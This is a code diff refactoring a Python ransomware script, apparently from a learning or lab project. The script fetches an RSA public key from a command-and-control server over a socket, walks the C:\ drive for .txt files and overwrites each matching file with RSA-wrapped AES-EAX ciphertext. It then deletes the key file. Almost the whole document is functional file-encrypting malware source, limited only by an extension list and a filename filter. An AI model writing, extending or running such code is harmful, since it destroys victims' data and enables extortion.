@@ -1,61 +1,66 @@
 import os
 import socket
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP, AES
+from Crypto.PublicKey   import RSA
+from Crypto.Cipher      import PKCS1_OAEP, AES
+from Crypto.Random      import get_random_bytes
 
 
+IP_ADDRESS  = '127.0.0.1'
+PORT        = 5678
 
-# Macros for Connection with C&C Server
-IP_ADDRESS = '127.0.0.1'
-PORT = 5678
+def get_public_key():
+    print('Creating socket...')
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        print('Connecting to C&C Server...')
+        s.connect((IP_ADDRESS, PORT))
 
-# get_files grabs all the files from C:\ that have extension in encrypted_extensions
-def get_files(encrypted_extensions):
+        s.send('public_key required!'.encode())
+        print('Retrieving public_key.pem...')
+        public_key = s.recv(1024)
+
+        with open('public_key.pem', 'wb') as public_key_file:
+            public_key_file.write(public_key)
+        s.close()
+    print('Done Retrieving: public_key.pem')
+
+def get_file_paths(encrypted_extensions):
     file_paths = []
-    for root, dirs, files in os.walk('C:\\'):
+    for root, _, files in os.walk('C:\\'):
         for file in files:
-            file_path, file_extension = os.path.splitext(root+'\\'+file)
+            _, file_extension = os.path.splitext(root+'\\'+file)
             if file_extension in encrypted_extensions:
                 file_paths.append(root+'\\'+file)
+    print('Done Getting File Paths')
     return file_paths
 
-def encrypt(dataFile, public_key_file):
-    with open(dataFile, 'rb') as f:
-        data = f.read()
-        data = bytes(data)
+def encrypt(file_path, public_key_file):
+    with open(file_path, 'rb') as file:
+        data = file.read()
 
-        with open (public_key_file, 'rb') as pkF: 
-            publicKey = pkF.read()
-            key = RSA.import_key(publicKey)
+    with open (public_key_file, 'rb') as pk_file: 
+        key = RSA.import_key(pk_file.read())
+
+    session_key = get_random_bytes(16)
+
+    cipher = PKCS1_OAEP.new(key)
+    encrypted_session_key = cipher.encrypt(session_key)
        
-        sessionKey = os.urandom(16)
+    cipher = AES.new(session_key, AES.MODE_EAX)
+    ciphertext, tag = cipher.encrypt_and_digest(data)
 
-        cipher = PKCS1_OAEP.new(key)
-        encryptedSessionKey = cipher.encrypt(sessionKey)
-
-        cipher = AES.new(sessionKey, AES.MODE_EAX)
-        ciphertext, tag = cipher.encrypt_and_digest(data)
-
-        with open(dataFile, 'wb') as f:
-            [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
+    with open(file_path, 'wb') as file:
+        [ file.write(x) for x in (encrypted_session_key, cipher.nonce, tag, ciphertext) ]
         
-        print('Done Encrypting: ' + dataFile)
+    print('Done Encrypting: ' + file_path)
 
 
-
-# Execution Starts Here!S
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((IP_ADDRESS, PORT))
-    s.send('public_key required!'.encode())
-    public_key = s.recv(1024)
-    with open('public_key.pem', 'wb') as f:
-        f.write(public_key)
-    s.close()
-
-encrypted_extensions = ('.txt',) # all the extensions that will be encrypted
-
-file_paths = get_files(encrypted_extensions)
-
-for f in file_paths:
-    if 'random_file' in f:
-        encrypt(f, 'public_key.pem')
+get_public_key()
+print('\n')
+encrypted_extensions = ('.txt',)
+file_paths = get_file_paths(encrypted_extensions)
+print('\n')
+for file_path in file_paths:
+    if 'random_file' in file_path:
+        encrypt(file_path, 'public_key.pem')
+print('\n')
+os.remove('public_key.pem')
